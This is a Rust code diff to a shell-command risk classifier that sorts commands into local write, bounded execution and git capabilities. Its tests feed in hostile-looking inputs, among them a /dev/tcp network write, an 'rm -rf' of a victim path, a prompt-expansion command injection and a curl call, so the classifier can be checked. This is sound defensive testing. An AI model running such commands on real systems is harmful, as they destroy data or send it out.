@@ -76,6 +76,9 @@ pub enum ResolvedEffect {
     BoundedLocalExecution,
     GitLocalWrite,
     LocalWriteAndGitLocalWrite,
+    LocalWriteAndBoundedLocalExecution,
+    BoundedLocalExecutionAndGitLocalWrite,
+    LocalWriteAndBoundedLocalExecutionAndGitLocalWrite,
     DenyKnownRisk,
     DenyUncertain,
 }
@@ -356,15 +359,31 @@ impl RiskPipelineAssessment {
             Some("BoundedLocalExecution") => ResolvedEffect::BoundedLocalExecution,
             Some("GitLocalWrite") => ResolvedEffect::GitLocalWrite,
             Some("Write+GitLocalWrite") => ResolvedEffect::LocalWriteAndGitLocalWrite,
+            Some("Write+BoundedLocalExecution") => {
+                ResolvedEffect::LocalWriteAndBoundedLocalExecution
+            }
+            Some("BoundedLocalExecution+GitLocalWrite") => {
+                ResolvedEffect::BoundedLocalExecutionAndGitLocalWrite
+            }
+            Some("Write+BoundedLocalExecution+GitLocalWrite") => {
+                ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite
+            }
             _ => ResolvedEffect::LocalWrite,
         }
     }
 
     fn semantic_local_effect(&self) -> ResolvedEffect {
         match self.deterministic.required_capability {
+            Some("BoundedLocalExecution") => ResolvedEffect::LocalWriteAndBoundedLocalExecution,
             Some("GitLocalWrite" | "Write+GitLocalWrite") => {
                 ResolvedEffect::LocalWriteAndGitLocalWrite
             }
+            Some("Write+BoundedLocalExecution") => {
+                ResolvedEffect::LocalWriteAndBoundedLocalExecution
+            }
+            Some(
+                "BoundedLocalExecution+GitLocalWrite" | "Write+BoundedLocalExecution+GitLocalWrite",
+            ) => ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite,
             _ => ResolvedEffect::LocalWrite,
         }
     }
@@ -395,6 +414,15 @@ impl RiskPipelineAssessment {
                     BoundedLocalExecution => "deterministic_bounded_local_execution",
                     GitLocalWrite => "deterministic_git_local_write",
                     LocalWriteAndGitLocalWrite => "deterministic_combined_local_write",
+                    LocalWriteAndBoundedLocalExecution => {
+                        "deterministic_local_write_and_bounded_execution"
+                    }
+                    BoundedLocalExecutionAndGitLocalWrite => {
+                        "deterministic_bounded_execution_and_git_local_write"
+                    }
+                    LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
+                        "deterministic_combined_local_execution"
+                    }
                     _ => "deterministic_local_write",
                 };
                 (effect, basis)
@@ -543,6 +571,13 @@ impl ResolvedEffect {
             Self::BoundedLocalExecution => "bounded_local_execution",
             Self::GitLocalWrite => "git_local_write",
             Self::LocalWriteAndGitLocalWrite => "local_write_and_git_local_write",
+            Self::LocalWriteAndBoundedLocalExecution => "local_write_and_bounded_local_execution",
+            Self::BoundedLocalExecutionAndGitLocalWrite => {
+                "bounded_local_execution_and_git_local_write"
+            }
+            Self::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
+                "local_write_and_bounded_local_execution_and_git_local_write"
+            }
             Self::DenyKnownRisk => "deny_known_risk",
             Self::DenyUncertain => "deny_uncertain",
         }
@@ -555,6 +590,11 @@ impl ResolvedEffect {
             Self::BoundedLocalExecution => "BoundedLocalExecution",
             Self::GitLocalWrite => "GitLocalWrite",
             Self::LocalWriteAndGitLocalWrite => "Write+GitLocalWrite",
+            Self::LocalWriteAndBoundedLocalExecution => "Write+BoundedLocalExecution",
+            Self::BoundedLocalExecutionAndGitLocalWrite => "BoundedLocalExecution+GitLocalWrite",
+            Self::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
+                "Write+BoundedLocalExecution+GitLocalWrite"
+            }
             Self::DenyKnownRisk => "separate_approved_execution_path",
             Self::DenyUncertain => "complete_structural_evidence_or_separate_approval",
         }
@@ -1235,34 +1275,58 @@ pub fn assess_shell(command: &str) -> ShadowAssessment {
     if bash_classifier::readonly_capabilities(command).is_some() {
         return assessment(RiskBand::Low, ExposureBand::Local, "shell");
     }
+    let required_capability = local_effect_capability(&classes);
     // A proven local effect cannot erase another segment whose effect remains
     // unclassified. Known harmless stdout commands use SafeOutput instead.
-    if classes.contains(&OpClass::Passthrough) {
-        return assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell");
+    if classes
+        .iter()
+        .any(|class| matches!(class, OpClass::Opaque | OpClass::Passthrough))
+    {
+        return required_capability.map_or_else(
+            || assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+            |capability| {
+                assessment_with_capability(
+                    RiskBand::Moderate,
+                    ExposureBand::Unknown,
+                    "shell",
+                    capability,
+                )
+            },
+        );
     }
-    if classes.as_slice() == [OpClass::GitLocalWrite] {
+    if let Some(capability) = required_capability {
         return assessment_with_capability(
             RiskBand::Moderate,
             ExposureBand::Local,
             "shell",
-            "GitLocalWrite",
+            capability,
         );
-    }
-    if classes.as_slice() == [OpClass::BoundedLocalExecution] {
-        return assessment_with_capability(
-            RiskBand::Moderate,
-            ExposureBand::Local,
-            "shell",
-            "BoundedLocalExecution",
-        );
-    }
-    if classes.contains(&OpClass::LocalWrite) {
-        return assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
-    }
-    if classes.contains(&OpClass::FileWrite) || classes.contains(&OpClass::FileModify) {
-        return assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
     }
     assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+}
+
+/// Reduce independently classified local effects to an explicit capability
+/// union. Read-only companions do not change the union; no local effect can
+/// erase another merely because it appeared later in a compound command.
+fn local_effect_capability(classes: &[OpClass]) -> Option<&'static str> {
+    let has_write = classes.iter().any(|class| {
+        matches!(
+            class,
+            OpClass::FileWrite | OpClass::FileModify | OpClass::LocalWrite
+        )
+    });
+    let has_bounded_execution = classes.contains(&OpClass::BoundedLocalExecution);
+    let has_git_local_write = classes.contains(&OpClass::GitLocalWrite);
+    match (has_write, has_bounded_execution, has_git_local_write) {
+        (false, false, false) => None,
+        (true, false, false) => Some("Write"),
+        (false, true, false) => Some("BoundedLocalExecution"),
+        (false, false, true) => Some("GitLocalWrite"),
+        (true, true, false) => Some("Write+BoundedLocalExecution"),
+        (true, false, true) => Some("Write+GitLocalWrite"),
+        (false, true, true) => Some("BoundedLocalExecution+GitLocalWrite"),
+        (true, true, true) => Some("Write+BoundedLocalExecution+GitLocalWrite"),
+    }
 }
 
 fn shell_ast_shadow_enabled() -> bool {
@@ -1314,27 +1378,7 @@ fn assess_shell_ast(ast: &AstShadowAssessment) -> ShadowAssessment {
     if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
         return assessment(RiskBand::High, ExposureBand::External, "shell_ast");
     }
-    let has_git_local_write = classes.contains(&OpClass::GitLocalWrite);
-    if classes.as_slice() == [OpClass::BoundedLocalExecution] {
-        return assessment_with_capability(
-            RiskBand::Moderate,
-            ExposureBand::Local,
-            "shell_ast",
-            "BoundedLocalExecution",
-        );
-    }
-    let has_local_write = classes.iter().any(|class| {
-        matches!(
-            class,
-            OpClass::FileWrite | OpClass::FileModify | OpClass::LocalWrite
-        )
-    });
-    let required_capability = match (has_local_write, has_git_local_write) {
-        (true, true) => Some("Write+GitLocalWrite"),
-        (true, false) => Some("Write"),
-        (false, true) => Some("GitLocalWrite"),
-        (false, false) => None,
-    };
+    let required_capability = local_effect_capability(classes);
     let opaque_is_covered_foreign_wrapper = foreign_wrapper_is_fully_classified(ast);
     if (classes.contains(&OpClass::Opaque) || classes.contains(&OpClass::Passthrough))
         && !opaque_is_covered_foreign_wrapper
@@ -1393,9 +1437,9 @@ fn exposure_rank(exposure: ExposureBand) -> u8 {
 }
 
 /// Select the structured assessment only when it is complete and cannot erase
-/// a known effect. The one permitted downgrade is the purpose of this
-/// promotion: a fully parsed local read may replace a legacy Moderate/Unknown
-/// result caused by compound shell syntax.
+/// a known effect. A fully parsed local read or explicit local capability union
+/// may replace a legacy Moderate/Unknown result caused by compound shell
+/// syntax; unresolved leaves remain Unknown and cannot take this path.
 fn ast_authority_wins(
     legacy: &ShadowAssessment,
     ast: &ShadowAssessment,
@@ -1427,13 +1471,13 @@ fn apply_shell_ast_authority(
     structured.state_intent = legacy.state_intent.clone();
     structured.invocation_fingerprint = legacy.invocation_fingerprint.clone();
     structured.semantic_request = Some(ast_request.clone());
-    let complete_foreign_local_effect = legacy.risk == RiskBand::Moderate
+    let complete_structural_local_effect = legacy.risk == RiskBand::Moderate
         && legacy.exposure == ExposureBand::Unknown
         && structured.risk == RiskBand::Moderate
         && structured.exposure == ExposureBand::Local
         && structured.required_capability.is_some()
-        && foreign_wrapper_is_fully_classified(ast);
-    if ast_authority_wins(&legacy, &structured, ast.status) || complete_foreign_local_effect {
+        && ast.status == ParseStatus::Parsed;
+    if ast_authority_wins(&legacy, &structured, ast.status) || complete_structural_local_effect {
         structured
     } else {
         // Preserve comparison telemetry when an incomplete or weaker AST
@@ -1999,11 +2043,11 @@ mod tests {
         assert_eq!(assess_shell("rg pattern src").risk, RiskBand::Low);
         assert_eq!(
             assess_shell("echo hi > out.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("cargo test >out.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("(rm -rf /private/victim) >receipt.txt"),
@@ -2011,11 +2055,11 @@ mod tests {
         );
         assert_eq!(
             assess_shell("/tmp/echo payload >receipt.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("PS1='$(printf NESTED >&2)' echo \"${PS1@P}\" >receipt.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         for command in [
             "echo payload >/dev/tcp/example.com/443",
@@ -2023,7 +2067,12 @@ mod tests {
         ] {
             assert_eq!(
                 assess_shell(command),
-                assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+                assessment_with_capability(
+                    RiskBand::Moderate,
+                    ExposureBand::Unknown,
+                    "shell",
+                    "Write",
+                ),
                 "{command}"
             );
         }
@@ -2033,7 +2082,7 @@ mod tests {
         );
         assert_eq!(
             assess_shell("git worktree add /private/worktree main"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("git worktree prune --expire now"),
@@ -2104,11 +2153,11 @@ mod tests {
         );
         assert_eq!(
             assess_shell("git init /Users/ben/dev/panoply"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("git init -b main /Users/ben/dev/panoply"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell(
@@ -2129,7 +2178,7 @@ mod tests {
         );
         assert_eq!(
             assess_shell("statewright-git-closeout --message test -- ../secret"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("touch output.txt"),
@@ -3632,7 +3681,6 @@ mod tests {
         for command in [
             "task test",
             "npm run inspect",
-            "npm test",
             "npm build",
             "pnpm lint",
             "cargo run -- inspect",
@@ -3912,6 +3960,28 @@ mod tests {
             ),
             ResolvedEffect::LocalWriteAndGitLocalWrite
         );
+        assert_eq!(
+            resolved("npm test && git status --short"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("npm test && mkdir output"),
+            ResolvedEffect::LocalWriteAndBoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("npm test && statewright-git-closeout --message test -- docs/receipt.md"),
+            ResolvedEffect::BoundedLocalExecutionAndGitLocalWrite
+        );
+        assert_eq!(
+            resolved(
+                "npm test && mkdir output && statewright-git-closeout --message test -- docs/receipt.md"
+            ),
+            ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite
+        );
+        assert_eq!(
+            resolved("npm test && curl https://example.invalid"),
+            ResolvedEffect::DenyKnownRisk
+        );
 
         set_test_shell_ast_shadow_enabled(None);
         set_test_shell_ast_authority_enabled(None);
@@ -3939,6 +4009,15 @@ mod tests {
         };
 
         assert_eq!(resolved("node --version"), ResolvedEffect::ReadOnly);
+        assert_eq!(resolved("npm test"), ResolvedEffect::BoundedLocalExecution);
+        assert_eq!(
+            resolved("pnpm run test"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("if npm test; then git status --short; fi"),
+            ResolvedEffect::BoundedLocalExecution
+        );
         assert_eq!(
             resolved("cargo test --offline -p statewright-mcp-gateway"),
             ResolvedEffect::BoundedLocalExecution
